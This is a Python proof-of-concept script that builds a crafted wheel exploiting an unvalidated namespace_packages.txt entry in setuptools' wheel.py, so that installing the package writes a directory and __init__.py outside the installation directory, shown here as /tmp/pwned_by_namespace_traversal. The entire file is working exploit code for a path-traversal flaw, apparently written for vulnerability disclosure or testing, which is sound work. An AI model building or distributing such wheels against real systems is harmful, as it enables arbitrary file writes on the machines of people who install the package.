#!/usr/bin/env python3
"""
Proof-of-Concept: Namespace Package Path Traversal in setuptools wheel.py

This creates a malicious wheel that exploits the vulnerability in
_fix_namespace_packages() to write files outside the installation directory.

Vulnerability: wheel.py:230
    mod_dir = os.path.join(destination_eggdir, *mod.split('.'))

The namespace_packages.txt content is not validated, allowing absolute paths
or path traversal sequences that escape the destination directory.
"""

import zipfile
import hashlib
import base64
import os

# Output location
WHEEL_NAME = "malicious-1.0-py3-none-any.whl"
OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))
WHEEL_PATH = os.path.join(OUTPUT_DIR, WHEEL_NAME)

# The malicious payload - this will create /tmp/pwned_by_namespace_traversal/
# When split by '.', this becomes ['/tmp/pwned_by_namespace_traversal']
# os.path.join(dest, '/tmp/pwned_by_namespace_traversal') = '/tmp/pwned_by_namespace_traversal'
MALICIOUS_NAMESPACE = "/tmp/pwned_by_namespace_traversal"

def sha256_b64(content: bytes) -> str:
    """Calculate sha256 hash in RECORD format."""
    digest = hashlib.sha256(content).digest()
    return "sha256=" + base64.urlsafe_b64encode(digest).rstrip(b'=').decode('ascii')

def build_wheel():
    # Wheel metadata
    wheel_content = b"""\
Wheel-Version: 1.0
Generator: poc-generator
Root-Is-Purelib: true
Tag: py3-none-any
"""

    metadata_content = b"""\
Metadata-Version: 2.1
Name: malicious
Version: 1.0
Summary: PoC for namespace_packages.txt path traversal
"""

    # The malicious namespace_packages.txt
    namespace_content = (MALICIOUS_NAMESPACE + "\n").encode('utf-8')

    # A dummy top_level.txt (required for valid egg conversion)
    top_level_content = b"malicious\n"

    # A dummy __init__.py for the "package"
    init_content = b"# Malicious package\n"

    # Build file list for RECORD
    files = [
        ("malicious/__init__.py", init_content),
        ("malicious-1.0.dist-info/WHEEL", wheel_content),
        ("malicious-1.0.dist-info/METADATA", metadata_content),
        ("malicious-1.0.dist-info/namespace_packages.txt", namespace_content),
        ("malicious-1.0.dist-info/top_level.txt", top_level_content),
    ]

    # Build RECORD content
    record_lines = []
    for path, content in files:
        record_lines.append(f"{path},{sha256_b64(content)},{len(content)}")
    record_lines.append("malicious-1.0.dist-info/RECORD,,")  # RECORD itself has no hash
    record_content = ("\n".join(record_lines) + "\n").encode('utf-8')

    files.append(("malicious-1.0.dist-info/RECORD", record_content))

    # Create the wheel (ZIP file)
    with zipfile.ZipFile(WHEEL_PATH, 'w', zipfile.ZIP_DEFLATED) as whl:
        for path, content in files:
            whl.writestr(path, content)

    print(f"Created malicious wheel: {WHEEL_PATH}")
    print(f"\nPayload in namespace_packages.txt: {MALICIOUS_NAMESPACE!r}")
    print(f"\nWhen installed, this will create:")
    print(f"  Directory: {MALICIOUS_NAMESPACE}/")
    print(f"  File:      {MALICIOUS_NAMESPACE}/__init__.py")
    print(f"\nFile content will be:")
    print(f"  __import__('pkg_resources').declare_namespace(__name__)")

    # Show wheel contents
    print(f"\n--- Wheel Contents ---")
    with zipfile.ZipFile(WHEEL_PATH, 'r') as whl:
        for info in whl.infolist():
            print(f"  {info.filename}")

    print(f"\n--- namespace_packages.txt content ---")
    print(f"  {namespace_content.decode('utf-8')!r}")

if __name__ == "__main__":
    build_wheel()
